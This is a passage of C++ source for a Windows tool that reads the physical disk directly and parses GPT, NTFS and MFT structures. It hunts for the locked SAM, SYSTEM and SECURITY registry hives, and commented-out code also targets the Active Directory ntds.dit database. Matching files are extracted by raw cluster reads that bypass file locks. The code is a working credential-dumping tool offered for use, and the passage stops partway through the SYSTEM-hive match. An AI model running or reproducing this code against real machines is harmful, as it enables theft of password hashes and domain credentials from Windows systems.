#define _CRT_SECURE_NO_WARNINGS

// This tool crated by Shkudw
// https://github.com/ShkudW/NoNeedNTFS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <map>
#include <vector>
#include <locale>
#include <codecvt>
#include <stdint.h>
#include <algorithm>
#include <memory>

using namespace std;

#pragma pack(push, 1)

const DWORD MFT_SIGNATURE = 0x454C4946;
const DWORD ATTR_TYPE_FILENAME = 0x30;
const DWORD ATTR_TYPE_DATA = 0x80;
const DWORD ATTR_TYPE_END = 0xFFFFFFFF;
const ULONGLONG MAX_FILE_SIZE = 1ULL << 30;
const int MAX_CONSECUTIVE_INVALID = 1000;

struct NTFS_BOOT_SECTOR { //https://ntfs.com/ntfs-partition-boot-sector.htm
    BYTE JumpBoot[3];
    BYTE OemName[8];
    WORD BytesPerSector;
    BYTE SectorsPerCluster;
    BYTE Reserved1[7];
    BYTE MediaDescriptor;
    BYTE Reserved2[2];
    WORD SectorsPerTrack;
    WORD NumberOfHeads;
    DWORD HiddenSectors;
    DWORD Reserved3;
    DWORD Reserved4;
    ULONGLONG TotalSectors;
    ULONGLONG MFT_LCN;
    ULONGLONG MFTMirr_LCN;
    signed char ClustersPerMFTRecord;
    BYTE Reserved5[3];
    BYTE ClustersPerIndexBuffer;
    BYTE Reserved6[3];
    ULONGLONG VolumeSerialNumber;
    DWORD Checksum;
    BYTE BootCode[426];
    WORD EndMarker;
};

struct GPT_HEADER { //https://en.wikipedia.org/wiki/GUID_Partition_Table 
    BYTE Signature[8];
    DWORD Revision;
    DWORD HeaderSize;
    DWORD HeaderCRC32;
    DWORD Reserved;
    ULONGLONG CurrentLBA;
    ULONGLONG BackupLBA;
    ULONGLONG FirstUsableLBA;
    ULONGLONG LastUsableLBA;
    BYTE DiskGUID[16];
    ULONGLONG PartitionEntryLBA;
    DWORD NumberOfPartitions;
    DWORD PartitionEntrySize;
    DWORD PartitionArrayCRC32;
};

struct GPT_PARTITION_ENTRY {
    BYTE PartitionTypeGUID[16];
    BYTE UniquePartitionGUID[16];
    ULONGLONG StartingLBA;
    ULONGLONG EndingLBA;
    ULONGLONG Attributes;
    WCHAR PartitionName[36];
};

const BYTE BASIC_DATA_GUID[16] = {
    0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
    0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7
};

struct MFT_ENTRY_HEADER {
    DWORD Signature;
    WORD UpdateSequenceOffset;
    WORD UpdateSequenceSize;
    ULONGLONG LSN;
    WORD SequenceNumber;
    WORD HardLinkCount;
    WORD FirstAttributeOffset;
    WORD Flags;
    DWORD RealSize;
    DWORD AllocatedSize;
    ULONGLONG BaseFileRecord;
    WORD NextAttributeID;
    WORD Unused;
    DWORD MFTRecordNumber;
};

struct ATTRIBUTE_HEADER {
    DWORD AttributeType;
    DWORD Length;
    BYTE NonResident;
    BYTE NameLength;
    WORD NameOffset;
    WORD Flags;
    WORD AttributeID;
};

struct RESIDENT_ATTRIBUTE {
    DWORD ValueLength;
    WORD ValueOffset;
    BYTE IndexedFlag;
    BYTE Padding;
};

struct NONRESIDENT_ATTRIBUTE {
    ULONGLONG LowestVCN;
    ULONGLONG HighestVCN;
    WORD RunListOffset;
    WORD CompressionUnit;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};

struct FILE_NAME_ATTRIBUTE {
    ULONGLONG ParentDirectory;
    ULONGLONG CreationTime;
    ULONGLONG ModificationTime;
    ULONGLONG MFTChangeTime;
    ULONGLONG LastAccessTime;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    DWORD Flags;
    DWORD ReparseValue;
    BYTE FileNameLength;
    BYTE NamespaceType;
};

struct NON_RESIDENT_ATTRIBUTE {
    ULONGLONG StartingVCN;
    ULONGLONG EndingVCN;
    WORD DataRunsOffset;
    WORD CompressionUnitSize;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};

#pragma pack(pop)

// Globals
ULONGLONG g_BytesPerSector = 512;
ULONGLONG g_SectorsPerCluster = 8;
ULONGLONG g_CDriveStartLBA = 0;
ULONGLONG g_MFT_LCN = 0;
ULONGLONG g_ClusterSize = 4096;

struct MFTEntryInfo {
    string filename;
    ULONGLONG parent_entry;
    ULONGLONG file_size;
    bool is_directory;
    bool valid;
};
map<ULONGLONG, MFTEntryInfo> g_MFTCache;

struct DataRun {
    ULONGLONG vcn_start;
    ULONGLONG length_clusters;
    LONGLONG absolute_lcn;
};

vector<DataRun> g_MFT_Runs;
ULONGLONG g_MFTEntrySize = 1024;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

string WideToUtf8(const WCHAR* wstr, int len) {
    if (len <= 0) return string();
    std::wstring ws(wstr, wstr + len);
    std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
    return conv.to_bytes(ws);
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

ULONGLONG GetMFTRecordSizeFromClusters(signed char clustersPerRecord, ULONGLONG bytesPerSector, ULONGLONG sectorsPerCluster) {
    if (clustersPerRecord < 0) {
        int power = -clustersPerRecord;
        return 1ULL << power;
    }
    else {
        return (ULONGLONG)clustersPerRecord * sectorsPerCluster * bytesPerSector;
    }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ApplyFixupToMFTRecord(BYTE* rec, SIZE_T rec_size) {
    if (rec_size < sizeof(MFT_ENTRY_HEADER)) return false;
    MFT_ENTRY_HEADER* hdr = (MFT_ENTRY_HEADER*)rec;
    WORD usaOffset = hdr->UpdateSequenceOffset;
    WORD usaCount = hdr->UpdateSequenceSize;
    if (usaOffset == 0 || usaCount < 2) return false;

    SIZE_T usaByteOffset = (SIZE_T)usaOffset;
    SIZE_T usaTotalSize = (SIZE_T)usaCount * sizeof(WORD);
    if (usaByteOffset + usaTotalSize > rec_size) return false;

    WORD* usa = (WORD*)(rec + usaByteOffset);
    WORD usn = usa[0];
    int sectors = (int)(usaCount - 1);
    if (g_BytesPerSector == 0) return false;
    SIZE_T sectorSize = (SIZE_T)g_BytesPerSector;
    if (rec_size < (SIZE_T)sectors * sectorSize) return false;

    for (int i = 0; i < sectors; i++) {
        SIZE_T last_two_offset = ((SIZE_T)(i + 1) * sectorSize) - sizeof(WORD);
        if (last_two_offset + sizeof(WORD) > rec_size) return false;
        WORD* diskWord = (WORD*)(rec + last_two_offset);
        if (*diskWord != usn) return false;
        *diskWord = usa[1 + i];
    }
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadFromDrive(HANDLE hDisk, ULONGLONG lba, BYTE* buffer, ULONGLONG byteCount) {
    LARGE_INTEGER offset;
    offset.QuadPart = (LONGLONG)(lba * g_BytesPerSector);
    if (!SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN)) return false;

    DWORD toRead = (DWORD)byteCount;
    DWORD bytesRead = 0;
    if (!ReadFile(hDisk, buffer, toRead, &bytesRead, NULL)) return false;
    return ((ULONGLONG)bytesRead == byteCount);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadBootSector(HANDLE hDisk, ULONGLONG startLBA, NTFS_BOOT_SECTOR& outBoot) {
    BYTE buf[512];
    if (!ReadFromDrive(hDisk, startLBA, buf, 512)) return false;
    memcpy(&outBoot, buf, sizeof(NTFS_BOOT_SECTOR));
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool IsGPTDisk(HANDLE hDisk) {
    BYTE mbr[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, mbr, 512, &bytesRead, NULL)) {
        return false;
    }

    if (bytesRead >= 512 && mbr[450] == 0xEE) {
        return true;
    }

    BYTE gpt_header[512];
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    if (!ReadFile(hDisk, gpt_header, 512, &bytesRead, NULL)) {
        return false;
    }

    return (memcmp(gpt_header, "EFI PART", 8) == 0);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

ULONGLONG FindCDriveStartLBA(HANDLE hDisk) {
    BYTE gpt_header_buffer[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, gpt_header_buffer, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read GPT header\n");
        return 0;
    }

    const GPT_HEADER* gpt = (const GPT_HEADER*)gpt_header_buffer;

    if (memcmp(gpt->Signature, "EFI PART", 8) != 0) {
        printf("[-] Invalid GPT signature\n");
        return 0;
    }

    printf("  [+] GPT Header, Partition Entry LBA Section: %llu\n", gpt->PartitionEntryLBA);

    const DWORD ENTRIES_PER_SECTOR = 512 / 128;
    DWORD sectorsToRead = (gpt->NumberOfPartitions + ENTRIES_PER_SECTOR - 1) / ENTRIES_PER_SECTOR;

    for (DWORD sector = 0; sector < sectorsToRead; sector++) {
        BYTE partition_buffer[512];
        offset.QuadPart = (gpt->PartitionEntryLBA + sector) * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        if (!ReadFile(hDisk, partition_buffer, 512, &bytesRead, NULL)) {
            continue;
        }

        for (DWORD i = 0; i < ENTRIES_PER_SECTOR; i++) {
            const GPT_PARTITION_ENTRY* entry = (const GPT_PARTITION_ENTRY*)(partition_buffer + i * 128);

            if (memcmp(entry->PartitionTypeGUID, BASIC_DATA_GUID, 16) == 0) {
                ULONGLONG size = entry->EndingLBA - entry->StartingLBA;

                if (size > 1000000) {
                    printf("  [+] Found C: Drive at LBA %llu\n", entry->StartingLBA);
                    printf("  [+] Drive size: %.2f GB\n\n", (size * 512) / (1024.0 * 1024.0 * 1024.0));
                    return entry->StartingLBA;
                }
            }
        }
    }

    printf("[-] C: Drive not found\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

vector<DataRun> ParseDataRuns(const BYTE* data_runs, SIZE_T max_len) {
    vector<DataRun> runs;
    SIZE_T idx = 0;
    ULONGLONG vcn_cursor = 0;
    LONGLONG prev_lcn = 0;

    while (idx < max_len) {
        BYTE header = data_runs[idx];
        idx++;
        if (header == 0x00) break;

        int lengthSize = header & 0x0F;
        int offsetSize = (header >> 4) & 0x0F;

        if (lengthSize == 0 || lengthSize > 8 || offsetSize > 8) {
            break;
        }

        if (idx + lengthSize + offsetSize > max_len) {
            break;
        }

        ULONGLONG length = 0;
        for (int i = 0; i < lengthSize; i++) {
            length |= ((ULONGLONG)data_runs[idx + i]) << (8 * i);
        }
        idx += lengthSize;

        LONGLONG offset = 0;
        if (offsetSize > 0) {
            for (int i = 0; i < offsetSize; i++) {
                offset |= ((LONGLONG)data_runs[idx + i]) << (8 * i);
            }
            LONGLONG sign_bit = 1LL << (offsetSize * 8 - 1);
            if (offset & sign_bit) {
                LONGLONG mask = ((1LL << (offsetSize * 8)) - 1);
                offset = offset | (~mask);
            }
        }
        idx += offsetSize;

        LONGLONG lcn_start = prev_lcn + offset;

        DataRun r;
        r.vcn_start = vcn_cursor;
        r.length_clusters = length;
        r.absolute_lcn = lcn_start;
        runs.push_back(r);

        vcn_cursor += length;
        prev_lcn = lcn_start;
    }

    return runs;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MFTEntryInfo ParseMFTEntry(const BYTE* mft_entry, ULONGLONG record_size) {
    MFTEntryInfo info;
    info.valid = false;
    info.parent_entry = 0;
    info.file_size = 0;
    info.is_directory = false;

    if (record_size < sizeof(MFT_ENTRY_HEADER)) return info;
    const MFT_ENTRY_HEADER* hdr = (const MFT_ENTRY_HEADER*)mft_entry;
    if (hdr->Signature != MFT_SIGNATURE) return info;
    info.is_directory = (hdr->Flags & 0x02) != 0;

    WORD attrOffset = hdr->FirstAttributeOffset;
    if (attrOffset == 0 || attrOffset >= record_size) return info;

    while (attrOffset + sizeof(ATTRIBUTE_HEADER) < record_size) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + attrOffset);
        if (attr->Length == 0) break;
        if (attr->AttributeType == ATTR_TYPE_END) break;

        if (attr->AttributeType == ATTR_TYPE_FILENAME && attr->NonResident == 0) {
            const RESIDENT_ATTRIBUTE* r = (const RESIDENT_ATTRIBUTE*)(mft_entry + attrOffset + sizeof(ATTRIBUTE_HEADER));
            DWORD valOff = r->ValueOffset;
            if (valOff == 0) { attrOffset += attr->Length; continue; }
            const BYTE* valPtr = mft_entry + attrOffset + valOff;
            if (valPtr + sizeof(FILE_NAME_ATTRIBUTE) > mft_entry + record_size) { attrOffset += attr->Length; continue; }
            const FILE_NAME_ATTRIBUTE* fna = (const FILE_NAME_ATTRIBUTE*)valPtr;
            int name_len = fna->FileNameLength;
            if (name_len > 0 && name_len < 1024) {
                const WCHAR* wname = (const WCHAR*)(valPtr + sizeof(FILE_NAME_ATTRIBUTE));
                string utf8 = WideToUtf8(wname, name_len);
                info.filename = utf8;
                info.parent_entry = fna->ParentDirectory & 0x0000FFFFFFFFFFFFULL;
                info.file_size = fna->RealSize;
                info.valid = true;
            }
        }

        attrOffset += attr->Length;
    }

    return info;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadMFTEntryUsingRunlist(HANDLE hDisk, ULONGLONG entry_number, BYTE* outBuf, ULONGLONG record_size) {
    ULONGLONG byteOffset = entry_number * record_size;
    ULONGLONG clusterIndex = byteOffset / g_ClusterSize;
    ULONGLONG offsetWithinCluster = byteOffset % g_ClusterSize;

    for (size_t i = 0; i < g_MFT_Runs.size(); i++) {
        DataRun& r = g_MFT_Runs[i];
        if (clusterIndex >= r.vcn_start && clusterIndex < r.vcn_start + r.length_clusters) {
            ULONGLONG insideRunIndex = clusterIndex - r.vcn_start;
            LONGLONG targetLCN = r.absolute_lcn + (LONGLONG)insideRunIndex;
            if (targetLCN < 0) return false;

            ULONGLONG bytesToCover = offsetWithinCluster + record_size;
            ULONGLONG clustersToRead = (bytesToCover + g_ClusterSize - 1) / g_ClusterSize;
            ULONGLONG bytesToRead = clustersToRead * g_ClusterSize;

            vector<BYTE> temp((size_t)bytesToRead);

            ULONGLONG readLBA = (ULONGLONG)targetLCN * g_SectorsPerCluster + g_CDriveStartLBA;
            if (!ReadFromDrive(hDisk, readLBA, temp.data(), bytesToRead)) {
                return false;
            }

            memcpy(outBuf, temp.data() + offsetWithinCluster, (size_t)record_size);

            if (!ApplyFixupToMFTRecord(outBuf, (SIZE_T)record_size)) {
                return false;
            }
            return true;
        }
    }

    return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

string ReconstructPath(HANDLE hDisk, ULONGLONG entry_number, ULONGLONG record_size, int max_depth = 256) {
    if (max_depth <= 0) return "???";
    if (entry_number == 5) return "C:\\";
    if (entry_number == 0 || entry_number > 0xFFFFFFFFFFFFULL) return "???";

    if (g_MFTCache.find(entry_number) == g_MFTCache.end()) {
        vector<BYTE> rec((size_t)record_size);
        if (!ReadMFTEntryUsingRunlist(hDisk, entry_number, rec.data(), record_size)) {
            MFTEntryInfo bad; bad.valid = false;
            g_MFTCache[entry_number] = bad;
            return "???";
        }
        MFTEntryInfo info = ParseMFTEntry(rec.data(), record_size);
        g_MFTCache[entry_number] = info;
        if (!info.valid) return "???";
    }

    MFTEntryInfo& info = g_MFTCache[entry_number];
    if (!info.valid) return "???";
    if (info.parent_entry == 5) return string("C:\\") + info.filename;
    if (info.parent_entry == 0) return string("C:\\") + info.filename;
    string parent = ReconstructPath(hDisk, info.parent_entry, record_size, max_depth - 1);
    if (parent == "???") return string("???\\") + info.filename;
    if (parent.back() == '\\') return parent + info.filename;
    return parent + "\\" + info.filename;
}

bool BuildMFTRunlistFromEntry0(HANDLE hDisk, ULONGLONG record_size) {
    ULONGLONG bytesToRead = max(record_size, g_ClusterSize);
    ULONGLONG clustersToRead = (bytesToRead + g_ClusterSize - 1) / g_ClusterSize;
    ULONGLONG readBytes = clustersToRead * g_ClusterSize;

    vector<BYTE> rec((size_t)readBytes);

    if (!ReadFromDrive(hDisk, (ULONGLONG)g_MFT_LCN * g_SectorsPerCluster + g_CDriveStartLBA, rec.data(), readBytes)) {
        if (!ReadFromDrive(hDisk, (ULONGLONG)g_MFT_LCN * g_SectorsPerCluster + g_CDriveStartLBA, rec.data(), g_ClusterSize)) {
            return false;
        }
    }

    vector<BYTE> recRecord((size_t)record_size);
    memset(recRecord.data(), 0, (size_t)record_size);
    memcpy(recRecord.data(), rec.data(), min((size_t)readBytes, (size_t)record_size));

    if (!ApplyFixupToMFTRecord(recRecord.data(), (SIZE_T)record_size)) {
        // Fixup failed, but continue
    }

    const MFT_ENTRY_HEADER* hdr = (const MFT_ENTRY_HEADER*)recRecord.data();
    if (hdr->Signature != MFT_SIGNATURE) return false;

    WORD offset = hdr->FirstAttributeOffset;
    SIZE_T rec_size_t = (SIZE_T)record_size;
    while (offset + sizeof(ATTRIBUTE_HEADER) < rec_size_t) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(recRecord.data() + offset);
        if (attr->Length == 0) break;
        if (attr->AttributeType == ATTR_TYPE_END) break;

        if (attr->AttributeType == ATTR_TYPE_DATA && attr->NonResident != 0) {
            const NONRESIDENT_ATTRIBUTE* nonres = (const NONRESIDENT_ATTRIBUTE*)(recRecord.data() + offset + sizeof(ATTRIBUTE_HEADER));
            WORD runlistOffset = nonres->RunListOffset;
            if (runlistOffset == 0) return false;
            const BYTE* runlistPtr = recRecord.data() + offset + runlistOffset;
            SIZE_T maxLen = attr->Length - runlistOffset;
            vector<DataRun> runs = ParseDataRuns(runlistPtr, maxLen);
            if (runs.empty()) return false;
            g_MFT_Runs = runs;
            return true;
        }

        offset += attr->Length;
    }

    return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool DetectNTFSParameters(HANDLE hDisk, ULONGLONG cDriveStartLBA) {
    BYTE boot_sector[512];
    LARGE_INTEGER offset;
    offset.QuadPart = cDriveStartLBA * 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, boot_sector, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read boot sector\n");
        return false;
    }

    if (memcmp(boot_sector + 3, "NTFS    ", 8) != 0) {
        printf("[-] Not an NTFS partition\n");
        return false;
    }

    const NTFS_BOOT_SECTOR* bs = (const NTFS_BOOT_SECTOR*)boot_sector;

    g_SectorsPerCluster = bs->SectorsPerCluster;
    g_MFT_LCN = bs->MFT_LCN;
    g_ClusterSize = bs->BytesPerSector * g_SectorsPerCluster;

    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ExtractFile(HANDLE hDisk, ULONGLONG entry_number, const char* output_filename) {
    printf("\n[Extracting File from MFT Entry %llu]\n", entry_number);


    vector<BYTE> mft_entry(g_MFTEntrySize);

    ULONGLONG byte_offset_in_mft = entry_number * g_MFTEntrySize;
    ULONGLONG vcn = byte_offset_in_mft / g_ClusterSize;
    ULONGLONG offset_in_cluster = byte_offset_in_mft % g_ClusterSize;

    bool found = false;
    for (size_t i = 0; i < g_MFT_Runs.size(); i++) {
        const DataRun& run = g_MFT_Runs[i];
        ULONGLONG vcn_end = run.vcn_start + run.length_clusters;

        if (vcn >= run.vcn_start && vcn < vcn_end) {
            ULONGLONG vcn_offset = vcn - run.vcn_start;
            ULONGLONG lcn = run.absolute_lcn + vcn_offset;
            ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
            ULONGLONG physical_offset = (physical_lba * 512) + offset_in_cluster;

            LARGE_INTEGER seek_offset;
            seek_offset.QuadPart = physical_offset;
            SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN);

            DWORD bytesRead;
            if (!ReadFile(hDisk, mft_entry.data(), (DWORD)g_MFTEntrySize, &bytesRead, NULL)) {
                printf("[-] Failed to read MFT entry\n");
                return false;
            }
            found = true;
            break;
        }
    }

    if (!found) {
        printf("[-] VCN %llu not found in MFT data runs\n", vcn);
        return false;
    }

    if (!ApplyFixupToMFTRecord(mft_entry.data(), g_MFTEntrySize)) {
        printf("[!] Warning: Fixup failed, continuing anyway\n");
    }

    MFT_ENTRY_HEADER* header = (MFT_ENTRY_HEADER*)mft_entry.data();

    if (header->Signature != MFT_SIGNATURE) {
        printf("[-] Invalid MFT signature: 0x%08X (expected 0x%08X)\n", header->Signature, MFT_SIGNATURE);
        return false;
    }

    printf("[+] Valid MFT entry\n");

    DWORD offset = header->FirstAttributeOffset;

    while (offset < g_MFTEntrySize && offset > 0) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry.data() + offset);

        if (attr->AttributeType == ATTR_TYPE_END || attr->Length == 0) break;

        if (attr->AttributeType == ATTR_TYPE_DATA) {
            printf("[+] Found $DATA attribute\n");

            if (attr->NonResident == 1) {

                const NON_RESIDENT_ATTRIBUTE* nonres_attr = (const NON_RESIDENT_ATTRIBUTE*)(mft_entry.data() + offset + sizeof(ATTRIBUTE_HEADER));

                ULONGLONG real_size = nonres_attr->RealSize;
                ULONGLONG allocated_size = nonres_attr->AllocatedSize;

                printf("    File size: %llu bytes (%.2f KB)\n", real_size, real_size / 1024.0);
                printf("    Allocated: %llu bytes\n", allocated_size);

                if (allocated_size > MAX_FILE_SIZE) {
                    printf("[-] File too large: %llu bytes (limit: %llu bytes)\n", allocated_size, MAX_FILE_SIZE);
                    return false;
                }

                const BYTE* data_runs = mft_entry.data() + offset + nonres_attr->DataRunsOffset;
                vector<DataRun> runs = ParseDataRuns(data_runs, g_MFTEntrySize - (offset + nonres_attr->DataRunsOffset));

                if (runs.empty()) {
                    printf("[-] No data runs found\n");
                    return false;
                }

                printf("    Found %zu data run(s)\n", runs.size());

                vector<BYTE> file_buffer((size_t)allocated_size);
                ULONGLONG buffer_offset = 0;

                for (size_t i = 0; i < runs.size(); i++) {
                    LONGLONG lcn = runs[i].absolute_lcn;
                    ULONGLONG num_clusters = runs[i].length_clusters;
                    ULONGLONG cluster_bytes = num_clusters * g_ClusterSize;

                    if (lcn == 0) {
                        printf("    Run #%zu: SPARSE, Length=%llu clusters (%llu bytes) - filling with zeros\n",
                            i + 1, num_clusters, cluster_bytes);
                        memset(file_buffer.data() + buffer_offset, 0, (size_t)cluster_bytes);
                        buffer_offset += cluster_bytes;
                        continue;
                    }

                    printf("    Run #%zu: LCN=%lld, Length=%llu clusters (%llu bytes)\n",
                        i + 1, lcn, num_clusters, cluster_bytes);

                    ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
                    ULONGLONG physical_offset = physical_lba * g_BytesPerSector;

                    LARGE_INTEGER seek_offset;
                    seek_offset.QuadPart = physical_offset;

                    if (!SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN)) {
                        printf("    [-] Failed to seek\n");
                        return false;
                    }

                    ULONGLONG remaining = cluster_bytes;
                    const DWORD MAX_READ_CHUNK = 0x10000000;

                    while (remaining > 0) {
                        DWORD to_read = (remaining > MAX_READ_CHUNK) ? MAX_READ_CHUNK : (DWORD)remaining;
                        DWORD bytes_read = 0;

                        if (!ReadFile(hDisk, file_buffer.data() + buffer_offset, to_read, &bytes_read, NULL)) {
                            printf("    [-] Failed to read at offset %llu\n", buffer_offset);
                            return false;
                        }

                        buffer_offset += bytes_read;
                        remaining -= bytes_read;

                        if (bytes_read != to_read) {
                            printf("    [-] Incomplete read: expected %lu, got %lu\n", to_read, bytes_read);
                            return false;
                        }
                    }
                }

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    return false;
                }

                fwrite(file_buffer.data(), 1, (size_t)real_size, out);
                fclose(out);

                printf("\n[SUCCESS] Saved to %s (%llu bytes)\n", output_filename, real_size);
                return true;
            }
            else {
                const RESIDENT_ATTRIBUTE* res_attr = (const RESIDENT_ATTRIBUTE*)(mft_entry.data() + offset + sizeof(ATTRIBUTE_HEADER));
                DWORD value_len = res_attr->ValueLength;
                const BYTE* data = mft_entry.data() + offset + res_attr->ValueOffset;

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("[-] Failed to create output file\n");
                    return false;
                }

                fwrite(data, 1, value_len, out);
                fclose(out);

                printf("\n[SUCCESS] Saved to %s (%u bytes, resident)\n", output_filename, value_len);
                return true;
            }
        }

        offset += attr->Length;
    }

    printf("[-] $DATA attribute not found\n");
    return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int main(int argc, char* argv[]) {
    const char* drive_path = (argc > 1) ? argv[1] : "\\\\.\\PhysicalDrive0";

    HANDLE hDisk = CreateFileA(drive_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("[!] Are you sure you have admin rights?\n");
        return 1;
    }

    printf("[+] Opened PhysicalDrive0");

    if (!IsGPTDisk(hDisk)) {
        printf("[-] Not a GPT disk\n");
        CloseHandle(hDisk);
        return 1;
    }

    printf("[+] GPT disk detected\n");

    g_CDriveStartLBA = FindCDriveStartLBA(hDisk);
    if (g_CDriveStartLBA == 0) {
        printf("[-] Failed to find C: drive\n");
        CloseHandle(hDisk);
        return 1;
    }

    printf("[+] C: Drive found at LBA %llu\n", g_CDriveStartLBA);

    if (!DetectNTFSParameters(hDisk, g_CDriveStartLBA)) {
        CloseHandle(hDisk);
        return 1;
    }
    printf("[+] NTFS detected\n");

    NTFS_BOOT_SECTOR boot;
    if (!ReadBootSector(hDisk, g_CDriveStartLBA, boot)) {
        printf("[-] Could not read NTFS boot sector\n");
        CloseHandle(hDisk);
        return 1;
    }

    if (strncmp((char*)boot.OemName, "NTFS    ", 8) != 0) {
        printf("[-] Not NTFS (OEM: %.8s)\n", boot.OemName);
        CloseHandle(hDisk);
        return 1;
    }

    g_BytesPerSector = boot.BytesPerSector;
    g_SectorsPerCluster = boot.SectorsPerCluster;
    g_ClusterSize = g_BytesPerSector * g_SectorsPerCluster;
    g_MFT_LCN = boot.MFT_LCN;

    ULONGLONG mft_record_size = GetMFTRecordSizeFromClusters(boot.ClustersPerMFTRecord, g_BytesPerSector, g_SectorsPerCluster);
    g_MFTEntrySize = mft_record_size;

    printf("  Bytes Per Sector: %llu\n", g_BytesPerSector);
    printf("  Sectors Per Cluster: %llu\n", g_SectorsPerCluster);
    printf("  Cluster Size: %llu bytes\n", g_ClusterSize);
    printf("  MFT LCN: %llu\n", g_MFT_LCN);
    printf("  MFT Record Size: %llu bytes\n\n", mft_record_size);

    printf("[Step 3] Building $MFT runlist from entry 0...\n");
    if (!BuildMFTRunlistFromEntry0(hDisk, mft_record_size)) {
        printf("[!] Could not build runlist from entry 0\n");

        DataRun r;
        r.vcn_start = 0;
        r.length_clusters = 0xFFFFFFFFFFFFFFFFULL;
        r.absolute_lcn = (LONGLONG)g_MFT_LCN;
        g_MFT_Runs.clear();
        g_MFT_Runs.push_back(r);
    }
    else {
        printf("[+] Runlist parsed successfully. Runs found: %zu\n", g_MFT_Runs.size());
        for (size_t i = 0; i < g_MFT_Runs.size(); i++) {
            printf("  Run %zu: VCN=%llu, LEN=%llu clusters, LCN=%lld\n",
                i, g_MFT_Runs[i].vcn_start, g_MFT_Runs[i].length_clusters, g_MFT_Runs[i].absolute_lcn);
        }
    }

    const int MAX_ENTRIES = 1000000;
    int found = 0;
    int consecutive_invalid = 0;
    bool sami = false;
    bool sysi = false;
    bool seci = false;
    bool ntdi = false;
    vector<BYTE> recBuf((size_t)mft_record_size);

    for (int i = 0; i < MAX_ENTRIES; i++) {
        bool ok = ReadMFTEntryUsingRunlist(hDisk, (ULONGLONG)i, recBuf.data(), mft_record_size);
        if (!ok) {
            consecutive_invalid++;
            if (consecutive_invalid > MAX_CONSECUTIVE_INVALID && i > 1000) {
                printf("\n[+] Reached end of MFT at entry %d (consecutive invalid: %d)\n", i, consecutive_invalid);
                break;
            }
            continue;
        }

        consecutive_invalid = 0;
        MFTEntryInfo info = ParseMFTEntry(recBuf.data(), mft_record_size);
        if (!info.valid) continue;

        string fullpath = ReconstructPath(hDisk, (ULONGLONG)i, mft_record_size);
        const char* type = info.is_directory ? "DIR" : "FILE";

        if (i % 10000 == 0 && i > 0) {
            fprintf(stderr, "[Where Are You ..] Scanned entry %d, found %d valid entries\n", i, found);
            if (sami && sysi && seci) {
                printf("\n[+] Yalla Bye!.\n");
                break;
            }
        }
        //if (i % 10000 == 0 && i > 0) {
        //    fprintf(stderr, "[AB-InBev] Scanned entry %d, found %d valid entries\n", i, found);
        //    if (sami && ntdi) {
        //        printf("\n[+] Yalla Bye!.\n");
        //        break;
        //    }
        //}

        found++;
            //if (info.filename == "ntds.dit" && fullpath == "C:\\Windows\\NTDS\\ntds.dit") {
            //    printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
            //        i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
            //    if (ExtractFile(hDisk, (ULONGLONG)i, "ntdi.bin")) {
            //        printf("[+] NTDS\n");
            //        ntdi = true;
            //    }
            //}

            if (info.filename == "SYSTEM" && fullpath == "C:\\Windows\\System32\\config\\SYSTEM") {
                printf("\n[MATCH] [%d] %s (%s) | Size: %llu | Path: %s\n",
                    i, info.filename.c_str(), type, info.file_size, fullpath.c_str());
